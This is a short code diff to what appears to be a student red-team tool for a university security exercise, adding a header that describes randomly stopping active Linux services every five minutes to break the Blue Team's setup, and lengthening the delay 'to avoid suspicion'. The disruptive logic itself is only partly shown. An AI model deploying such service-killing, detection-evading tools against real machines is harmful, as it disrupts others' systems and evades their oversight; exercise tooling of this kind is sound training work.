@@ -1,3 +1,13 @@
+"""
+A Red Team Tool that randomly selects active services on a Linux machine in five minute intervals (modifiable) and stops them.
+Meant to annoy and break the Blue Team's setup.
+
+Travis Hill
+twh9811@rit.edu
+9/21/2023
+CSEC 473, Fall 2231, Team Echo
+"""
+
 import subprocess
 import random
 import time
@@ -53,6 +63,6 @@ def main():
         # Disable the service
         disable_service(service)
         # Wait to avoid suspicion
-        wait(60)
+        wait(300)
 
 main()
